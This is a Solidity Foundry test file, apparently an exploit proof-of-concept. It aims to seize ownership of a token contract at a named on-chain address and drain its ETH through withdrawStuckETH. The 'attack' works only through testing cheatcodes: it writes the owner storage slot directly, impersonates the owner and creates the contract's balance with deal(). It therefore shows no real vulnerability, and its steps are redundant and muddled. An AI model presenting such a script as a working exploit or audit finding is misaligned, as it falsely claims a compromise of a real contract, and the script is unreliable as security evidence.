// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function withdrawStuckETH() external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Store owner address for use in test
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(address(this))))); // Make attacker the owner temporarily for testing
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get current owner address
        address currentOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();

        // Record initial balance for verification
        uint256 initialBalance = address(this).balance;

        // Impersonate current owner and transfer ownership to us
        vm.startPrank(currentOwner);
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transferOwnership(address(this));
        vm.stopPrank();

        // Verify we are now the owner
        address newOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        require(newOwner == address(this), "Failed to become owner");

        // Give the contract some ETH to withdraw
        // Using deal() cheatcode to set contract's balance
        deal(TARGET, 10 ether);

        // Verify contract has ETH
        require(TARGET.balance >= 10 ether, "Contract should have ETH");

        // Now as the owner, withdraw all ETH
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).withdrawStuckETH();

        // Check that contract balance is now 0
        assertEq(TARGET.balance, 0, "Contract should have 0 ETH after withdraw");

        // Check that our balance increased
        // Note: we need to account for gas costs, so use assertGt with some leeway
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance - 0.1 ether, "ETH balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
